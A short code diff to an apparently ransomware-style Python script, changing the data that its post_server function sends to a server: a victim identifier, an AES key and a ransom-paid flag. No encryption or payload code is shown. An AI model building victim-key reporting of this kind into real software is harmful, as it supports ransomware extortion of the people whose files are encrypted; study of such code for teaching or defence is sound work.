@@ -13,6 +13,9 @@ def post_server(data, url=URL):
 
 if __name__ == "__main__":
     # client = Client()
-    post_data = {"victim_id": "mkf", "AES_key": "456", "paid": True}
+    post_data = {"id": "mkf",
+                 "AES_key": "456",
+                 "ransom": "true"
+                 }
     post_server(post_data)
     # client.put(post_data)
